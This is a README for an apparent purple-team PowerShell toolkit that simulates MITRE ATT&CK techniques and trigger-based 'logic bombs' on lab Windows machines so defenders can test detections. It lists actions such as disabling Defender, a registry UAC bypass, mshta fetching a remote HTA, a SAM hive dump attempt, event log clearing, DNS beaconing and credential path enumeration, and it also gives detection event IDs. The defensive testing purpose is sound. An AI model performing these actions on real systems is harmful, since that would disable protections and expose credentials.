# SIGIL — Purple Team Simulation Framework v2

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/PowerShell-5.1%2B-blue?style=flat-square&logo=powershell" />
  <img src="https://img.shields.io/badge/MITRE%20ATT%26CK-mapped-red?style=flat-square" />
  <img src="https://img.shields.io/badge/use-lab%20only-orange?style=flat-square" />
</p>

> **SIGIL** — *Simulated Intel for Global Intrusion Logic*

A PowerShell-based purple team toolkit for generating realistic adversary telemetry on Windows endpoints. SIGIL maps directly to MITRE ATT&CK, includes full cleanup for every technique, and is designed to let detection engineers validate EDR/XDR/SIEM rules without the risk of persistent infection.

---

## ⚠️ Important — Read Before Running

```
FOR ISOLATED LAB / CONTROLLED TEST ENVIRONMENTS ONLY
DO NOT RUN ON PRODUCTION SYSTEMS OR DOMAIN-JOINED HOSTS
```

SIGIL writes real registry keys, creates real scheduled tasks, and makes real network requests. It is designed to be safe and fully reversible, but it **must** only be executed on a machine you own and control — ideally a dedicated VM that you can snapshot and revert.

The script automatically aborts if the host is domain-joined. To override in an approved lab:

```powershell
$env:SIGIL_FORCE_RUN = '1'
.\SIGIL_Mitre_v2.ps1 -All
```

---

## Repository Contents

| File | Description |
|------|-------------|
| `SIGIL_Mitre_v2.ps1` | Core MITRE ATT&CK simulation harness — 10 techniques, full cleanup, DryRun mode |
| `SIGIL_LogicBombs.ps1` | Trigger-based logic bomb simulations — 10 techniques that activate on conditions |
| `README.md` | This document |

---

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| OS | Windows 10 / Windows Server 2016 or later |
| PowerShell | 5.1 or higher |
| Environment | **Isolated lab VM — not domain-joined** |
| Privileges | Some techniques require an elevated (Administrator) prompt |
| Execution Policy | Run `Set-ExecutionPolicy Bypass -Scope Process` before executing |

---

## Quick Start

```powershell
# 1. Set execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process

# 2. Unblock downloaded files
Get-ChildItem . -Recurse | Unblock-File

# 3. Preview everything first (recommended)
.\SIGIL_Mitre_v2.ps1 -All -DryRun

# 4. Run all techniques
.\SIGIL_Mitre_v2.ps1 -All

# 5. Clean up when done
.\SIGIL_Mitre_v2.ps1 -Cleanup
```

---

## SIGIL_Mitre_v2.ps1

### What It Does

Simulates 10 MITRE ATT&CK techniques in sequence, logging exactly where each artifact is written so you can cross-reference your EDR/SIEM telemetry in real time. Every technique has a paired cleanup function and a DryRun guard.

### Techniques

| Flag | MITRE ID | Technique | What Gets Written |
|------|----------|-----------|-------------------|
| `-RunKey` | T1547.001 | Registry Run Key Persistence | `HKCU:\...\Run\SIGIL_SIM_RunKey` |
| `-UACBypass` | T1548.002 | UAC Bypass via Registry | `HKLM:\...\Policies\System\ConsentPromptBehaviorAdmin = 0` |
| `-DisableDefender` | T1562.001 | Disable Windows Defender | `HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1` |
| `-ScheduledTask` | T1053.005 | Scheduled Task Persistence | Task Scheduler: `SIGIL_SIM_Task` (OnLogon trigger) |
| `-LSASS` | T1003.001 | LSASS Process Enumeration | Process list query only — no memory read |
| `-MSHTA` | T1218.005 | LOLBin via mshta.exe | Launches `mshta.exe http://example.com/sigil_test.hta` |
| `-ServiceBackdoor` | T1543.003 | Fake Windows Service Key | `HKLM:\SYSTEM\CurrentControlSet\Services\SIGIL_SIM_FakeSvc` |
| `-RegSAM` | T1003.002 | SAM Hive Dump Attempt | Attempts `reg save HKLM\SAM` — access denied expected |
| `-EventLogClear` | T1070.001 | Event Log Marker + Clear | Writes EventID 9999 to Application log then clears it |
| `-Certutil` | T1140 | Certutil LOLBin Decode | `%TEMP%\SIGIL_SIM\encoded_payload.txt` → `decoded_payload.bin` |

### Parameters

```
-All              Run all 10 techniques
-RunKey           Run only T1547.001
-UACBypass        Run only T1548.002
-DisableDefender  Run only T1562.001
-ScheduledTask    Run only T1053.005
-LSASS            Run only T1003.001
-MSHTA            Run only T1218.005
-ServiceBackdoor  Run only T1543.003
-RegSAM           Run only T1003.002
-EventLogClear    Run only T1070.001
-Certutil         Run only T1140
-Cleanup          Remove all SIGIL artifacts from this host
-DryRun           Preview without executing — no changes made
-LogPath <path>   Write timestamped log to a file
```

### Usage Examples

```powershell
# Preview all techniques without making any changes
.\SIGIL_Mitre_v2.ps1 -All -DryRun

# Run all techniques
.\SIGIL_Mitre_v2.ps1 -All

# Run specific techniques
.\SIGIL_Mitre_v2.ps1 -RunKey -ScheduledTask -Certutil

# Run all techniques, then clean up immediately
.\SIGIL_Mitre_v2.ps1 -All -Cleanup

# Run specific techniques and clean up when done
.\SIGIL_Mitre_v2.ps1 -RunKey -ServiceBackdoor -Cleanup

# Full cleanup pass (removes everything SIGIL created)
.\SIGIL_Mitre_v2.ps1 -Cleanup

# Log everything to a file for post-exercise review
.\SIGIL_Mitre_v2.ps1 -All -LogPath "C:\Logs\sigil_$(Get-Date -f yyyyMMdd).txt"

# Run all and export log, then clean up
.\SIGIL_Mitre_v2.ps1 -All -LogPath "C:\Logs\sigil.txt" -Cleanup
```

### Safety Notes

**`-DisableDefender`** writes a **real** Windows Defender policy registry key. Defender will be suppressed on this host until you run `-Cleanup`. Do not leave this unclean.

**`-MSHTA`** launches `mshta.exe` which makes a **live DNS query and HTTP request** to `example.com`. This is intentional — the request is the telemetry signal. Expect to see this in your DNS/proxy/firewall logs.

**`-EventLogClear`** permanently clears the Windows Application event log. Export it first if you need to preserve it.

---

## SIGIL_LogicBombs.ps1

### What It Does

Simulates adversary "logic bomb" behaviors — techniques that activate based on a trigger condition (time, process start, file drop, user logon, environment check) rather than executing immediately. Each bomb is lab-safe and includes full cleanup.

### Techniques

| Flag | MITRE ID | Trigger | Behavior |
|------|----------|---------|----------|
| `-TimeBomb` | T1053.005 + T1124 | Time (5 min from now) | Creates a scheduled task that fires at a specific future time |
| `-ProcessWatchBomb` | T1546.003 | Process creation (notepad.exe) | WMI subscription activates when a target process starts |
| `-FileDropBomb` | T1105 + T1547 | Sentinel file creation | FileSystemWatcher fires when a staging file appears |
| `-LoginBomb` | T1547.001 | Next user logon | HKCU Run key + pre-stage marker written to disk |
| `-DNSBeacon` | T1071.004 | Immediate (repeated interval) | 5 rounds of C2-style DNS queries at 3-second intervals |
| `-ShadowCopyWipe` | T1490 | Immediate (safe echo only) | Stages shadow copy deletion commands — none are executed |
| `-CredHarvest` | T1555 + T1003 | Immediate | Enumerates DPAPI/browser/vault credential paths to a staging file |
| `-EnvTrigger` | T1082 + T1033 + T1497 | Immediate | Fingerprints the host and evaluates sandbox indicators |
| `-LOLBinChain` | T1218 + T1059 + T1140 | Immediate (staged) | Chains certutil → rundll32 → regsvr32 in sequence |
| `-WMIPersistence` | T1546.003 | Time-based (WMI event) | Creates full WMI filter + consumer + binding subscription |

### Parameters

```
-All                  Run all 10 logic bomb simulations
-TimeBomb             Run only time-triggered scheduled task
-ProcessWatchBomb     Run only WMI process watch subscription
-FileDropBomb         Run only FileSystemWatcher sentinel
-LoginBomb            Run only logon-triggered Run key
-DNSBeacon            Run only DNS beaconing simulation
-ShadowCopyWipe       Run only shadow copy wipe staging (safe)
-CredHarvest          Run only credential path enumeration
-EnvTrigger           Run only host fingerprint / sandbox check
-LOLBinChain          Run only certutil→rundll32→regsvr32 chain
-WMIPersistence       Run only WMI filter+consumer+binding
-Cleanup              Disarm all active logic bombs and remove artifacts
-DryRun               Preview without executing — no changes made
-LogPath <path>       Write timestamped log to a file
```

### Usage Examples

```powershell
# Preview all logic bombs without arming anything
.\SIGIL_LogicBombs.ps1 -All -DryRun

# Run all logic bombs
.\SIGIL_LogicBombs.ps1 -All

# Run specific bombs
.\SIGIL_LogicBombs.ps1 -DNSBeacon -EnvTrigger -LOLBinChain

# Run all and clean up immediately
.\SIGIL_LogicBombs.ps1 -All -Cleanup

# Full disarm — removes all active subscriptions, tasks, keys, and files
.\SIGIL_LogicBombs.ps1 -Cleanup
```

### Triggering the File Drop Bomb

After running `-FileDropBomb`, the watcher is armed in your current PowerShell session. Detonate it by creating the sentinel file:

```powershell
New-Item "$env:TEMP\SIGIL_LB\SIGIL_SENTINEL.txt" -ItemType File
```

The console will print a red activation message and write a hit log to the same directory.

### Customizing the DNS Beacon

The beacon targets `sigil-canary.example.com` by default. For real SIEM/firewall alerting, replace this with your own canary domain at the top of the script:

```powershell
$DNS_BEACON_DOMAIN   = "your-canary.yourdomain.com"  # your canary domain
$DNS_BEACON_ROUNDS   = 5                              # number of rounds
$DNS_BEACON_INTERVAL = 3                              # seconds between queries
```

### Persistence Warning

The following logic bombs **survive reboots** until explicitly cleaned up:

| Bomb | What Persists |
|------|--------------|
| `-TimeBomb` | Scheduled task in Task Scheduler |
| `-ProcessWatchBomb` | WMI subscription in `root\subscription` |
| `-LoginBomb` | HKCU Run key |
| `-WMIPersistence` | WMI filter + consumer + binding in `root\subscription` |

Always run `.\SIGIL_LogicBombs.ps1 -Cleanup` after every session.

---

## Console Output

SIGIL uses a consistent log format across both scripts. Every line is prefixed with a timestamp and a level indicator:

```
[yyyy-MM-dd HH:mm:ss] [*] INFO message
[yyyy-MM-dd HH:mm:ss] [+] PASS - technique executed successfully
[yyyy-MM-dd HH:mm:ss] [X] FAIL - technique failed (see detail)
[yyyy-MM-dd HH:mm:ss] [!] WARN - safety warning
[yyyy-MM-dd HH:mm:ss] [~] DRY  - dry run preview
[yyyy-MM-dd HH:mm:ss] [C] CLEAN - artifact removed
[yyyy-MM-dd HH:mm:ss] [B] BOMB  - logic bomb simulation (LogicBombs module)
```

**Example output:**

```
[2026-03-25 14:32:01] [*] SIGIL MITRE Simulation Framework v2
[2026-03-25 14:32:01] [!] FOR ISOLATED LAB USE ONLY
[2026-03-25 14:32:01] [+] T1547.001 [Run Key] Written to: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SIGIL_SIM_RunKey -> C:\Windows\System32\notepad.exe
[2026-03-25 14:32:01] [+] T1053.005 [Scheduled Task] Written to: Task Scheduler -> \SIGIL_SIM_Task (trigger: OnLogon, action: notepad.exe)
[2026-03-25 14:32:02] [+] T1140 [Certutil Decode] Input:  C:\Users\...\AppData\Local\Temp\SIGIL_SIM\encoded_payload.txt
[2026-03-25 14:32:02] [+] T1140 [Certutil Decode] Output: C:\Users\...\AppData\Local\Temp\SIGIL_SIM\decoded_payload.bin
[2026-03-25 14:32:02] [!] Reminder: Run with -Cleanup flag to remove all artifacts when done.
```

---

## Detection Guidance

Use these event IDs to validate your detection rules after each simulation run:

| Technique | Log Source | Event ID / Signal |
|-----------|-----------|-------------------|
| Run Key written | Security / Sysmon | EventID 4657 (reg modified), Sysmon EID 13 |
| UAC bypass | Security / Sysmon | EventID 4657, ConsentPromptBehaviorAdmin value change |
| Defender disabled | Security / Sysmon | Sysmon EID 13, registry value under `\Policies\Microsoft\Windows Defender` |
| Scheduled task created | Security | EventID 4698 (task created), 4700 (enabled) |
| LSASS enumeration | Security / EDR | EventID 4688 (process create), EDR process access alert |
| mshta.exe LOLBin | Sysmon / EDR | Sysmon EID 1 (process create), EID 3 (network connection to example.com) |
| Service key written | Security / Sysmon | EventID 4697 (service install), Sysmon EID 13 |
| SAM dump attempt | Security / EDR | EventID 4688 (reg.exe), access denied on HKLM\SAM |
| Event log cleared | Security | EventID 1102 (audit log cleared) |
| Certutil decode | Sysmon / EDR | Sysmon EID 1 — certutil.exe with `-decode` argument |
| WMI subscription | WMI-Activity | EventID 5861 (permanent subscription created) |
| DNS beaconing | DNS debug / Zeek / EDR | Repeated NXDOMAIN queries with unique subdomains at regular intervals |
| LOLBin chain | Sysmon / EDR | Sysmon EID 1 — parent/child chain: certutil → rundll32 → regsvr32 |

---

## Recommended Lab Workflow

```
1.  Snapshot your VM at baseline before any simulation run
2.  Start your EDR / SIEM data collection
3.  Run DryRun to preview what will execute
4.  Run your chosen techniques
5.  Validate alerts, telemetry, and rule hits in your detection platform
6.  Document coverage gaps
7.  Run -Cleanup to restore the system to baseline
8.  Revert snapshot if needed before the next test cycle
```

---

## Adding New Techniques

Each technique follows a consistent pattern. To add a new one:

1. Add a `[switch]` parameter at the top of the script
2. Write an `Invoke-<TechniqueName>` function with a `$DryRun` guard at the top
3. Write a paired `Remove-<TechniqueName>` cleanup function
4. Log with `Write-Log` including the MITRE technique ID and the exact path written
5. Add the invocation to the main entry point block
6. Add it to `Invoke-FullCleanup`

```powershell
function Invoke-MyTechnique {
    # T1XXX.XXX - Brief description
    if ($DryRun) {
        Write-Log "DRY RUN -- Would do X to Y" DRY
        return
    }
    try {
        # ... your simulation code ...
        Write-Log "T1XXX.XXX [My Technique] Written to: <exact path>" PASS
    } catch {
        Write-Log "T1XXX.XXX [My Technique] Failed: $_" FAIL
    }
}

function Remove-MyTechnique {
    # ... cleanup code ...
    Write-Log "T1XXX.XXX [My Technique] Removed." CLEAN
}
```

---

## License

Apache 2.0 — see [LICENSE](LICENSE) for details.

---

## Disclaimer

SIGIL is intended exclusively for authorized security testing in controlled, isolated environments. The authors accept no responsibility for misuse or for any damage caused by running these scripts outside of an approved lab context. Always obtain explicit written authorization before running any simulation tooling on systems you do not own.

